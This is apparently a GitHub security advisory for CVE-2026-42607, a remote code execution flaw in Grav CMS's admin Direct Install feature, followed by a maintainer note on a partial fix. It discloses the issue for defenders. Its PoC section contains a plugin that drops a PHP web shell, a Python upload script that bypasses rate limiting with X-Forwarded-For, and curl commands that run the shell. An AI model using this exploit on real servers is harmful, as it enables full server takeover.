# [C] Grav Vulnerable to Remote Code Execution (RCE) via Malicious Plugin ZIP Upload in Direct Install Feature

## Summary
Severity: Critical
Advisory: GHSA-w48r-jppp-rcfw
CVE: CVE-2026-42607
CWE: CWE-94
Ecosystem: Packagist
CVSS: CVSS:3.1/AV:N/AC:L/PR:H/UI:N/S:C/C:H/I:H/A:H (CVSS_V3)
Published: 2026-05-05
Source: https://github.com/advisories/GHSA-w48r-jppp-rcfw
Type: github-advisory

## Affected
- Packagist: `getgrav/grav` — affected >=0 <2.0.0-beta.2

## Details
### Summary
An authenticated user with administrative privileges can achieve Remote Code Execution (RCE) by uploading a specially crafted ZIP file through the "Direct Install" tool. While the system attempts to block direct .php file uploads, it fails to inspect the contents of uploaded ZIP archives. Once a malicious plugin is extracted, it can execute arbitrary PHP code or drop a persistent web shell on the server.

### Details

The vulnerability exists in the handling of the directInstall task within the Admin plugin and the Grav Package Manager (GPM) core.

-    Vulnerable Endpoints: /admin/tools/direct-install
-   Vulnerable Logic: AdminController.php (lines 1247-1295) and Gpm.php (lines 214-285).
-    Root Cause: The function Installer::install() (called in Gpm.php:291) extracts the contents of the ZIP file directly into the /user/

plugins/ or /user/themes/ directories without validating the file extensions or the content of the files inside the archive.

### PoC
1. Prepare the Malicious Plugin

Create a directory named shellplugin and add the following files:

shellplugin.php:
```

<?php
namespace Grav\Plugin;
use Grav\Common\Plugin;

class ShellpluginPlugin extends Plugin {
    public static function getSubscribedEvents(): array {
        return ['onPluginsInitialized' => ['onPluginsInitialized', 0]];
    }
    public function onPluginsInitialized(): void {
        $shell_path = GRAV_ROOT . '/shell.php';
        if (!file_exists($shell_path)) {
            file_put_contents($shell_path, '<?php system($_GET["cmd"]); ?>');
        }
    }
}

```
(Also include a basic blueprints.yaml and shellplugin.yaml as per Grav standards).

2. Create the ZIP Archive
```
`zip -r /tmp/shellplugin.zip shellplugin/`

3. Execute the Exploit Script
Run the following Python script to automate the login, nonce retrieval, and malicious upload process:

`import requests, re, json


s = requests.Session()
BASE_URL = 'http://127.0.0.1'
```

#### 1. Login and Bypass Rate Limit via X-Forwarded-For
```
r = s.get(f'{BASE_URL}/admin')
nonce = re.search(r'name="login-nonce" value="([^"]+)"', r.text).group(1)

r2 = s.post(f'{BASE_URL}/admin',
    headers={'X-Forwarded-For': '10.0.0.3'},
    data={'data[username]': 'admin', 'data[password]': 'admin_password_here', 'task': 'login', 'login-nonce': nonce},
    allow_redirects=False)

redirect = json.loads(r2.text)['redirect']
s.get(redirect)
print(f"[+] Logged in successfully.")

```
####  2. Extract Admin Nonce from Tools Page
```
tools = s.get(f'{BASE_URL}/admin/tools/direct-install')
admin_nonce = re.search(r'admin-nonce.*?value="([a-f0-9]{32})"', tools.text).group(1)
print(f"[+] Retrieved Admin Nonce: {admin_nonce}")
```

####  3. Upload and Execute
```
with open('/tmp/shellplugin.zip', 'rb') as f:
    zip_data = f.read()

resp = s.post(f'{BASE_URL}/admin/tools/direct-install',
    data={'task': 'directInstall', 'admin-nonce': admin_nonce},
    files={'uploaded_file': ('shellplugin.zip', zip_data, 'application/zip')},
    headers={'X-Forwarded-For': '10.0.0.3'}
)

if "installation" in resp.text.lower():
    print("[+] Plugin installed successfully!")
    # Trigger the shell
    s.get(BASE_URL) 
    print(f"[+] RCE Check: {BASE_URL}/shell.php?cmd=id")`
```
    
####  4. Verification
Access the dropped shell to confirm command execution:
`curl -s "http://127.0.0.1/shell.php?cmd=whoami"`

<img width="2547" height="756" alt="resim (2)" src="https://github.com/user-attachments/assets/6a8c25f1-9a9d-469f-ab68-3c7007e446d4" />

<img width="898" height="89" alt="resim (3)" src="https://github.com/user-attachments/assets/ec097785-1196-47a4-b24e-82fcbf0f7520" />


### Impact

- Vulnerability Type: Remote Code Execution (RCE) / Path Traversal (via extraction).
- Who is impacted: Any Grav installation where the Admin plugin is enabled and an attacker has gained administrative access (or an administrator is tricked into uploading a malicious ZIP).
- Severity: Critical. Although it requires admin privileges, the ability to gain full server control (system-level access) makes this a high-impact finding, especially in multi-user environments or via CSRF/Session hijacking.

## Maintainer note — partial fix applied (2026-04-24)

Fixed in Grav core on the `2.0` branch: commit [`5a12f9be8`](https://github.com/getgrav/grav/commit/5a12f9be8) — ships in **2.0.0-beta.2**.

**What changed (path layer):** `Installer::unZip` now pre-validates every entry name before calling `ZipArchive::extractTo`, and aborts the install if any entry looks like a Zip Slip primitive — `..` path segments, absolute paths (Unix `/…` or Windows `C:\…`/`\…`), or NUL bytes. A crafted ZIP can no longer write files outside the target `user/plugins/<slug>` or `user/themes/<slug>` directory.

**Explicit scope limitation:** the "well-formed but malicious plugin code" angle of the PoC — uploading a plugin whose own PHP is the payload — is **not** addressed by this change. `directInstall` is an administrator-only operation whose explicit purpose is to install arbitrary PHP; defending against it would require a plugin-signing or marketplace-allowlist feature, which is a separate roadmap item. Administrators should only install plugins from trusted sources. This is now explicitly documented in the commit note.

**Files:**
- [`system/src/Grav/Common/GPM/Installer.php`](https://github.com/getgrav/grav/blob/2.0/system/src/Grav/Common/GPM/Installer.php) — new `isSafeArchiveEntry()` helper + pre-extract validation loop.
- [`tests/unit/Grav/Common/Security/ZipSlipSecurityTest.php`](https://github.com/getgrav/grav/blob/2.0/tests/unit/Grav/Common/Security/ZipSlipSecurityTest.php) — 21 cases covering Unix/Windows/URL-encoded traversal primitives and legitimate plugin names.

---

### Acknowledgements
The issue was identified by Security Researcher **Mustafa Murat Akgül**.


---

## References
- https://github.com/getgrav/grav/security/advisories/GHSA-w48r-jppp-rcfw
- https://nvd.nist.gov/vuln/detail/CVE-2026-42607
- https://github.com/getgrav/grav/commit/5a12f9be8314682c8713e569e330f11805d0a663
- https://github.com/getgrav/grav
